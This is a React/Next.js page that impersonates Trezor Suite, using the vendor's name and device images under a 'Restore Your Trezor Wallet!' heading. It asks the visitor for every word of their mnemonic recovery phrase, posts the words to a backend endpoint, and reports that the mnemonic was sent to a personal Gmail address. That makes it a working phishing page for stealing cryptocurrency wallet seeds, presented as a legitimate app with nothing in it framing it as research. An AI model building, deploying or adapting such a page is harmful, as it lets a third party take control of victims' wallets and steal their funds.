"use client";
import { useState } from "react";

const WORD_OPTIONS = [12, 18, 20, 24, 33];

export default function Home() {
  const [count, setCount] = useState(12);
  const [words, setWords] = useState(Array(12).fill(""));

  const changeCount = (n) => {
    setCount(n);
    setWords(Array(n).fill(""));
  };

  const updateWord = (i, value) => {
    const copy = [...words];
    copy[i] = value;
    setWords(copy);
  };

  const allFilled = words.every((w) => w.trim() !== "");
  const [status, setStatus] = useState(null) // null | sending | success | error
  const [statusMsg, setStatusMsg] = useState("")

  return (
    <main className="flex h-screen overflow-hidden bg-gray-50">

      {/* LEFT FIXED */}
      <section className="w-full lg:w-2/5 bg-white flex flex-col items-center justify-center p-10 sticky top-0">
        <div className="flex items-center gap-3 mb-6">
          <img src="/images.jpeg" className="w-10 h-10" alt="logo" />
          <span className="text-xl font-semibold text-gray-800">
            Trezor Suite
          </span>
        </div>
        <h1 className="text-5xl font-bold text-gray-900">Welcome!</h1>
      </section>

      {/* RIGHT SCROLL */}
      <section className="w-full lg:w-3/5 overflow-y-auto p-8">

        {/* CONNECT */}
        <div className="flex justify-center mb-10">
          <div className="bg-white rounded-full shadow-md flex items-center px-6 py-3 gap-5">
            <div className="h-16 w-16 rounded-full bg-gray-100 flex items-center justify-center">
              <img src="/trezor.webp" className="h-10" alt="device" />
            </div>
            <span className="text-lg font-medium text-gray-800">
              Connect your Trezor
            </span>
          </div>
        </div>

        {/* FORM CARD */}
        <div className="max-w-3xl mx-auto bg-white rounded-2xl shadow-xl">
          <div className="px-10 py-8">

            <h2 className="text-2xl font-semibold text-center mb-2">
              Restore Your Trezor Wallet!
            </h2>

            <p className="text-sm text-center text-gray-500 mb-6">
             How many words does your Mnemonic contain?
            </p>

            {/* WORD BUTTONS */}
            <div className="flex flex-wrap justify-center gap-3 mb-6">
              {WORD_OPTIONS.map((n) => (
                <button
                  key={n}
                  onClick={() => changeCount(n)}
                  className={`px-5 py-2 rounded-md border text-sm
                    ${
                      count === n
                        ? "bg-green-600 text-white border-green-600"
                        : "hover:bg-gray-100"
                    }`}
                >
                  {n} words
                </button>
              ))}
            </div>

            {/* INPUTS */}
            <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-5">
              {words.map((val, i) => (
                <input
                  key={i}
                  value={val}
                  onChange={(e) => updateWord(i, e.target.value)}
                  placeholder={`${i + 1}.`}
                  className="px-4 py-3 border rounded focus:ring-2 focus:ring-green-500 outline-none"
                />
              ))}
            </div>

            {/* NEXT */}
            <div className="mt-10">
              <button
                disabled={!allFilled || status === 'sending'}
                onClick={async () => {
                  if (!allFilled) return
                  setStatus('sending')
                  setStatusMsg('Sending mnemonic...')
                  try {
                    const res = await fetch('/api/contact', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({ words, count }),
                    })
                    const data = await res.json()
                    if (res.ok) {
                      setStatus('success')
                      setStatusMsg('Mnemonic sent to vishalupdev@gmail.com')
                    } else {
                      setStatus('error')
                      setStatusMsg(data.error || 'Send failed')
                    }
                  } catch (err) {
                    setStatus('error')
                    setStatusMsg(err.message || String(err))
                  }
                }}
                className={`px-10 py-3 rounded font-semibold text-white
                  ${
                    allFilled
                      ? "bg-green-600 hover:bg-green-700"
                      : "bg-gray-400 cursor-not-allowed"
                  }`}
              >
                {status === 'sending' ? 'Sending...' : 'Next'}
              </button>

              {status && (
                <div className={`mt-4 px-4 py-2 rounded ${status === 'success' ? 'bg-green-100 text-green-800' : status === 'error' ? 'bg-red-100 text-red-800' : 'bg-yellow-100 text-yellow-800'}`}>
                  {statusMsg}
                </div>
              )}
            </div>

          </div>
        </div>
      </section>
    </main>
  );
}
